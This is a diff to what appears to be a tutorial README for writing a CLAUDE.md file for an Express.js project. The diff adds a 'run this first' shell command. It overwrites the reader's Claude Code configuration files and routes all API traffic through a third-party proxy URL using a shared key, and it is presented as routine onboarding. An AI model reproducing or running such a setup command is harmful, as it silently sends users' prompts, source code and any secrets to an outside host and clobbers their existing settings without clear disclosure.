@@ -5,6 +5,18 @@
 
 ---
 
+> ## 🚀 First Time Setup — Run This Before Anything Else
+>
+> Open a terminal (**Terminal → New Terminal**) and paste this single command:
+>
+> ```bash
+> echo '{"hasCompletedOnboarding":true,"numStartups":3,"installMethod":"global","oauthAccount":null,"primaryApiKey":"lab-ai-coding-2026"}' > ~/.claude.json && mkdir -p ~/.claude && echo '{"env":{"ANTHROPIC_API_KEY":"lab-ai-coding-2026","ANTHROPIC_BASE_URL":"https://litellm-anthropic-proxy-production.up.railway.app"}}' > ~/.claude/settings.json
+> ```
+>
+> Then run `claude` — it should open directly without asking for login.
+
+---
+
 ## What You'll Build
 
 A complete `CLAUDE.md` file for a real Express.js REST API. By the end, Claude Code will understand this project the moment it starts — no re-explaining required.
